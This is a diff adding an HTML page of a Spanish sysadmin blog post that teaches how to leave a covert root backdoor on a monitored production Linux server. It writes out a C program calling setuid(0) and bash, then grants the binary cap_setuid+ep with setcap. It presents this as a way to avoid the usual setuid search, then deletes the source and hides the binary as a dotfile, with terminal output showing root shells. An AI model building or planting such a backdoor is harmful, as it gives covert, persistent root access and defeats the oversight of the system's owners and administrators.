@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8" />
+	<meta name="viewport" content="width=device-width, initial-scale=1" />
+	<title>Un root shell en C - Linux Sysadmin</title>
+	<link rel="stylesheet" href="/style.css" />
+</head>
+<body>
+<div class="menu">
+	<a class="important"href="/">Linux Sysadmin</a>
+	<a href="/about.html">Sobre mí</a>
+	<a href="/curriculum.html">Curriculum Vitae</a>
+	<div class="right">
+		<a href="/categories.html">Categorías</a>
+		<a href="/tags.html">Tags</a>
+		<a href="/archives.html">Archivos</a>
+		<a href="https://github.com/sirtea">GitHub</a>
+	</div>
+</div>
+
+<h1>Un root shell en C</h1>
+
+<p class="headline">
+	<strong>Fecha</strong>: 2016-06-13
+	<strong>Tiempo de lectura</strong>: 2 minutos
+	<strong>Categoría</strong>: <a href="/category/operaciones.html">Operaciones</a>
+    <strong>Tags</strong>: <a href="/tag/linux.html">linux</a> / <a href="/tag/shell.html">shell</a> / <a href="/tag/root.html">root</a> / <a href="/tag/capabilities.html">capabilities</a>
+</p>
+
+<p>Cuando operamos un servidor de producción es habitual que no tengamos acceso habitual al usuario <em>root</em>, e incluso lo tengan altamente vigilado. Podemos intentar dejar una puerta trasera, por ejemplo poniendo un binario con el <em>setuid</em> bit activado, te pueden pillar. Sin embargo es posible dejar una puerta abierta oculta.</p>
+
+<p>El truco esta en las <em>linux capabilities</em>, que nos permiten dar permisos para operaciones concretas a binarios concretos; así pues, no es necesario ejecutar el binario con el usuario <em>root</em>.</p>
+
+<p>El resto es tan fácil como hacer un binario que escale a <em>root</em> y luego ejecute lo que necesitamos, por ejemplo, una línea de comandos <strong>bash</strong>.</p>
+
+<p>Aquí ponemos el código fuente necesario para hacer lo que pretendemos.</p>
+
+<pre><code class="language-bash">[gerard@server ~]$ cat root_shell.c
+int main() {
+    setuid(0);
+    system(&quot;bash&quot;);
+}
+[gerard@server ~]$
+</code></pre>
+
+<p>La compilación no tiene ningún misterio; lo compilamos con <strong>gcc</strong> y le pasamos un <strong>strip</strong> para reducir el tamaño al máximo.</p>
+
+<pre><code class="language-bash">[gerard@server ~]$ gcc -o root_shell root_shell.c
+[gerard@server ~]$ strip root_shell
+[gerard@server ~]$
+</code></pre>
+
+<p>Si tratamos de ejecutarlo, veremos que la llamada para escalar a <em>root</em> ha sido ignorada; el usuario que hemos usado no tiene permisos para hacer eso.</p>
+
+<pre><code class="language-bash">[gerard@server ~]$ ./root_shell
+[gerard@server ~]$ id
+uid=1002(gerard) gid=1002(gerard) groups=1002(gerard)
+[gerard@server ~]$ exit
+exit
+[gerard@server ~]$
+</code></pre>
+
+<p>Vamos a darle la <em>capability</em> <strong>CAP_SETUID</strong>. Además, le pondremos los flags <em>effective</em> y <em>permitted</em>, que darán la <em>capability</em> automáticamente y lo pasará a los procesos hijos. Mas información en <a href="http://linux.die.net/man/7/capabilities">la documentación</a>.</p>
+
+<p><strong>TRUCO</strong>: he usado <strong>sudo</strong> para hacer esta operación, pero como no tendremos esto en producción, tendremos que esperar una intervención en donde nos concedan ese permiso.</p>
+
+<pre><code class="language-bash">[gerard@server ~]$ sudo setcap cap_setuid+ep root_shell
+[sudo] password for gerard:
+[gerard@server ~]$
+</code></pre>
+
+<p>Ejecutando el binario, vemos que hemos obtenido lo que esperábamos; un binario que nos deja ante una línea de comandos con el usuario <em>root</em>.</p>
+
+<pre><code class="language-bash">[gerard@server ~]$ ./root_shell
+[root@server ~]# id
+uid=0(root) gid=1002(gerard) groups=1002(gerard)
+[root@server ~]# exit
+exit
+[gerard@server ~]$
+</code></pre>
+
+<p>Podemos ver que no hay permisos especiales tipo <em>setuid</em>, con lo que no pueden encontrarlo con el <strong>find</strong> habitual.</p>
+
+<pre><code class="language-bash">[gerard@server ~]$ ls -lh
+total 12K
+-rwxrwxr-x. 1 gerard gerard 4.3K Mar 31 18:01 root_shell
+-rw-rw-r--. 1 gerard gerard   50 Mar 31 17:59 root_shell.c
+[gerard@server ~]$
+</code></pre>
+
+<p>Vamos a intentar ocultar lo que nos delataría a simple vista; eliminamos el innecesario código fuente y ocultaremos el binario.</p>
+
+<pre><code class="language-bash">[gerard@server ~]$ rm root_shell.c
+[gerard@server ~]$ mv root_shell .hidden
+[gerard@server ~]$ 
+</code></pre>
+
+<p>Comprobamos que sigue funcionando, y que tiene la <em>capability</em> que le hemos dado.</p>
+
+<pre><code class="language-bash">[gerard@server ~]$ ./.hidden
+[root@server ~]# id
+uid=0(root) gid=1002(gerard) groups=1002(gerard)
+[root@server ~]# exit
+exit
+[gerard@server ~]$ getpcaps .hidden
+Capabilities for `.hidden': = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+i
+[gerard@server ~]$
+</code></pre>
+<p class="footer">Copyright &copy; 2015-2019 | Gerard Monells | <a href="https://github.com/sirtea">GitHub</a></p>
+
+</body>
+</html>
